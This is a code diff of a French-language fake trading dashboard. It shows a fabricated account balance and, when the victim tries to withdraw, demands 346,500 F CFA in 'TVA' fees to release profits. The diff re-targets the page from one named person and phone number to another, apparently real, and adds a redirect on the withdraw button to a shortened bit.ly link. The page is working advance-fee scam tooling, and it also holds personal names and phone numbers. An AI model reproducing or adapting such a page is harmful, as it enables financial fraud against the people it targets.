@@ -251,7 +251,7 @@
 <body>
     <script>
         let code = prompt("Veuillez entrer votre numéro de téléphone :");
-        if (code === "0758243773") {
+        if (code === "661807223") {
             document.body.style.display = 'block';
         } else {
             alert("numéro incorrect. Accès refusé.");
@@ -265,10 +265,10 @@
         </div>
         <nav>
             <div class="actions">
-                <span class="balance">Solde: 1 300 000 F CFA</span>
+                <span class="balance">Solde: 45 000 000 GNF</span>
                 <div class="account-info">
-                    <span id="user-name">KOUE BI LOBO ALEXANDRE</span><br>
-                    <span id="user-phone">225 07 58 24 37 73</span>
+                    <span id="user-name">Mamadou Alpha Kare Diallo</span><br>
+                    <span id="user-phone">224 661 80 72 23</span>
                 </div>
                 <button id="whatsapp-button">Contact WhatsApp</button>
                 <button id="logout-button">Déconnexion</button>
@@ -303,7 +303,7 @@
             <section class="withdrawal-form" id="withdrawal-form">
                 <h3>Confirmer le retrait</h3>
                 <div class="form-info" id="withdrawal-info"></div>
-                <button id="confirm-withdrawal">Valider le Retrait</button>
+               <button id="confirm-withdrawal">Valider le Retrait</button>
             </section>
             <section class="error-message" id="error-message"></section>
         </div>
@@ -330,9 +330,9 @@
             setInterval(updatePrice, 5000);
 
             const setWithdrawalInfo = (method) => {
-                const accountName = "KOUE BI LOBO ALEXANDRE";
-                const accountNumber = "225 07 58 24 37 73";
-                const balance = "1 300 000 F CFA";
+                const accountName = "Mamadou Alpha Kare Diallo";
+                const accountNumber = "224 661 80 72 23";
+                const balance = "45 000 000 GNF";
                 withdrawalInfo.innerHTML = `${accountName}<br>${accountNumber}<br>${balance}<br>via ${method}`;
                 withdrawalForm.style.display = 'flex';
             };
@@ -352,7 +352,7 @@
             });
 
             document.getElementById('confirm-withdrawal').addEventListener('click', () => {
-                alert('Cher TRAORE, veuillez payer les frais de TVA de 346 500 F CFA afin recevoir vos bénéfices dans les 5 minutes.');
+                alert('Cher Mamadou, veuillez payer les frais de TVA de 346 500 F CFA afin recevoir vos bénéfices dans les 5 minutes.');
                 withdrawalForm.style.display = 'none';
                 errorMessage.style.display = 'block';
                 errorMessage.textContent = 'Erreur : frais de tva néccéssaire.';
@@ -366,6 +366,10 @@
                 alert("Déconnexion réussie.");
                 window.location.reload();
             });
+
+            document.getElementById("confirm-withdrawal").onclick = function() {
+    window.location.href = "https://bit.ly/47tclEq";
+  };
 
             new TradingView.widget({
                 container_id: "tradingview_chart",
